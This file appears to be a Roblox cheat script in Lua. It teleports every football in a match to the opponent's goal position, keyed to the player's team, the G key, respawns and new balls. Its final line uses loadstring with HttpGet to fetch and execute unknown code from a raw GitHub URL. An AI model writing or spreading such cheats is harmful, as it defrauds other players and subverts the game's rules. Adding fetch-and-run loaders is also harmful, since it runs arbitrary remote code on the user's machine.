print "start load script"
--G gol
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer

-- Function to find all footballs in the Junk folder
local function findBalls()
    local junkFolder = Workspace:FindFirstChild("Junk")
    local balls = {}
    if junkFolder then
        for _, obj in pairs(junkFolder:GetChildren()) do
            if obj:IsA("Part") and obj.Name == "Football" then
                table.insert(balls, obj)
            end
        end
    else
        warn("Junk folder not found!")
    end
    return balls
end

-- Function to teleport all balls to the designated position based on the player's team
local function teleportAllBalls()
    local targetPosition

    -- Dynamically determine the target position based on the player's team
    if Player.Team then
        if Player.Team.Name == "Home" then
            targetPosition = Vector3.new(2.010676682, 4.00001144, -186.170898)
        elseif Player.Team.Name == "Away" then
            targetPosition = Vector3.new(-0.214612424, 4.00001144, 186.203613)
        end
    end

    if targetPosition then
        local balls = findBalls()
        if #balls > 0 then
            for _, ball in pairs(balls) do
                local success, errorMessage = pcall(function()
                    ball.CFrame = CFrame.new(targetPosition)
                end)
                if not success then
                    warn("Error teleporting ball: " .. errorMessage)
                end
            end
        else
            warn("No balls found!")
        end
    else
        warn("No team or target position found!")
    end
end

-- Handle player respawn
local function onPlayerRespawned()
    local character = Player.Character or Player.CharacterAdded:Wait()
    character:WaitForChild("HumanoidRootPart")
    wait(1) -- Ensure everything is loaded
    teleportAllBalls()
end

-- Handle team changes
local function onTeamChanged()
    print("Player's team has changed!")
    teleportAllBalls()
end

-- Trigger teleportation when the user presses 'G'
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.G then
        teleportAllBalls()
    end
end)

-- Connect to the player's respawn event
Player.CharacterAdded:Connect(onPlayerRespawned)

-- Listen for team changes
Player:GetPropertyChangedSignal("Team"):Connect(onTeamChanged)

-- Detect new footballs being added to the Workspace
Workspace.ChildAdded:Connect(function(child)
    if child:IsA("Part") and child.Name == "Football" then
        wait(0.5) -- Small delay for synchronization
        teleportAllBalls()
    end
end)




loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
print "end load script"
